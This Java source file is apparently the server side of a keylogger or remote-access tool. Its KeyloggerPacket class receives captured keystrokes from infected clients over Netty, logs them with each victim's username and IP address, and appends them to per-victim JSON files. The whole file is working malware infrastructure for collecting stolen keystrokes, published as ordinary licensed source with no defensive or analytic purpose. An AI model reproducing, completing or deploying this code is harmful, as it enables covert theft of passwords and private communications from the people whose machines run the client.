/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.protocol.packets.impl;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.protocol.packets.Packet;
import com.protocol.packets.PacketType;
import com.protocol.packets.Packets;
import com.protocol.packets.beans.Client;
import com.protocol.packets.beans.KeylogRecord;
import com.ctx.server.Constants;
import com.ctx.utils.DateTimeUtils;
import io.netty.buffer.ByteBuf;
import io.netty.channel.ChannelHandlerContext;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import lombok.Setter;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class KeyloggerPacket implements Packet
{
    @Setter
    private String keylogRec;
    
    @Override
    public int getOpcode() 
    {
        return Packets.KEYLOGGER_PACKET.getCode();
    }

    @Override
    public String getDescription() 
    {
        return Packets.KEYLOGGER_PACKET.getDescription();
    }

    @Override
    public PacketType getPacketType() 
    {
        return Packets.KEYLOGGER_PACKET.getPacketType();
    }

    @Override
    public void read(ChannelHandlerContext chc, ByteBuf in) throws Exception 
    {
        int length = in.readableBytes();
        
        if (length > 5 * 1024 * 1024) 
        {
            chc.channel().close();
            byte[] array = new byte[length];
            in.readBytes(array, 0, length);
            in.discardReadBytes();
            log.error("Invalid keylog length: {}", in.readableBytes());
            return;
        }
        
        byte[] array = new byte[length];
        in.readBytes(array, 0, length);
        keylogRec = new String(array);
        
        Client client = Client.getClients().get(chc.channel().id());
        log.info("KeylogRecord Received: {} {} | {}", client.getUsername(), client.getIp(), keylogRec);

        final File userDir = new File(Constants.DATA_DIR, client.getUsername() + "_" + client.getIp());
        if (!userDir.exists()) 
        {
            userDir.mkdir();
        }
        
        final File logsDir = new File(userDir, "logs");
        if (!logsDir.exists()) 
        {
            logsDir.mkdir();
        }
        
        final Path logFile = Paths.get(logsDir + Constants.seperator + DateTimeUtils.getCurrentDateString() + ".json");
         
        KeylogRecord keylogRecordBuilder = KeylogRecord.builder()
                .dateTime(DateTimeUtils.getCurrentDateTimeString())
                .keylogRecord(keylogRec)
                .build();
        
        Gson gson = new GsonBuilder()
                .excludeFieldsWithoutExposeAnnotation()
                .setPrettyPrinting()
                .create();
        
        try (OutputStream os = Files.newOutputStream(logFile, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) 
        {
             gson.toJson(keylogRecordBuilder, writer);
        } 
        catch (IOException ex) 
        {
        }

    }

    @Override
    public void write(ChannelHandlerContext chc, ByteBuf out) throws Exception 
    {
    }
    
}
